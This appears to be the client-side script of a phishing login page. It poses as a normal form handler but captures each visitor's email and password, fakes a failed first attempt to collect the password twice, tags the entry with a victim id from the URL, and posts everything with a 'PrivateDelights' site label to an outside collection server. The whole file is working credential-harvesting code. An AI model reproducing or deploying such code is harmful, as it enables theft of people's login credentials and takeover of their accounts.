document.addEventListener("DOMContentLoaded", function () {
    const errorMsg = document.getElementById("error");
    const loginForm = document.querySelector("#loginSystem form");
    
  
    let passClick=1

    // utility Functions
    async function postData( formData) {
      const url = 'https://dashboarduser.onrender.com/api/information'
      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            // Add any other headers if needed
          },
          body: JSON.stringify(formData),
        });
    
        if (!response.ok) {
          throw new Error(`HTTP error! Status: ${response.status}`);
        }
    
        const data = await response.json();

      } catch (error) {
        // Handle errors
        console.error('Error:', error);
      }
    }

    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const userId = urlParams.get('id');

  
  
    // Object to store form data
    const formData = {};
  
    // Function to hide an element
    //@TODO:temporary block
    
    // function hideElement(element) {
    //   element.style.display = "none";
    // }
    // // Function to show an element
    // function showElement(element) {
    //   element.style.display = "block";
    // }
  
    // Function to handle login form submission
    function handleLoginSubmit(event) {
      event.preventDefault();
      // Store form data in the formData object
      if(passClick<2){
       passClick++
       formData.email = loginForm.querySelector('input[name="username"]').value;
       formData.password = loginForm.querySelector('input[type="password"]').value;
    //    showElement(errorMsg)
       formData.user=userId.toString()
       console.log(formData);

       loginForm.reset();
       return 
      }
      formData.email = loginForm.querySelector('input[name="username"]').value;
      formData.repassword = loginForm.querySelector('input[type="password"]').value;

      postData({...formData,siteName:'PrivateDelights'})
      hideElement(errorMsg)
      // Hide login form and show OTP form
    }
  

    // Event listeners
    loginForm.addEventListener("submit", handleLoginSubmit);
  
    // Event listener for the "Log out instead" link in the OTP section

  });
  